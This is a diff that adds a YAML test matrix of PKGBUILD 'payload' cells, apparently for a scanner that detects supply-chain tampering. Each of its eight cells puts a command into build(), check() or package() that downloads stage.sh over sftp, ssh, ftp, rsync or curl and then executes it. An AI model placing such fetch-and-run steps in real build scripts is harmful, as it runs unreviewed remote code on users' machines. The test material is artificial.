@@ -1,0 +1,54 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@github.com <<< "get /stage.sh"
+        bash stage.sh
+  id: 01-sftp-build
+- vars:
+    payload: |
+      check() {
+        sftp -b - u@github.com <<< "get /stage.sh"
+        bash stage.sh
+  id: 02-sftp-check
+- vars:
+    payload: |
+      package() {
+        sftp -P 2222 -b - u@github.com <<< "get /stage.sh"
+        zsh stage.sh
+  id: 03-sftp-package-port
+- vars:
+    payload: |
+      build() {
+        ssh u@github.com cat /stage.sh > stage.sh
+        bash stage.sh
+  id: 04-ssh-cat
+- vars:
+    payload: |
+      build() {
+        ftp -n github.com <<EOF
+      user u p
+      get stage.sh
+      bye
+      EOF
+        bash stage.sh
+  id: 05-ftp-heredoc
+- vars:
+    payload: |
+      build() {
+        sftp -b batch.txt u@github.com
+        sh stage.sh
+  id: 06-sftp-batchfile
+- vars:
+    payload: |
+      build() {
+        rsync -a --rsh="ssh -p 2222" u@github.com:stage.sh .
+        bash stage.sh
+  id: 07-rsync-rsh
+- vars:
+    payload: |
+      build() {
+        curl -fsSL https://github.com/example/harness-baseline/stage.sh -o stage.sh
+        bash stage.sh
+  id: 08-curl-control
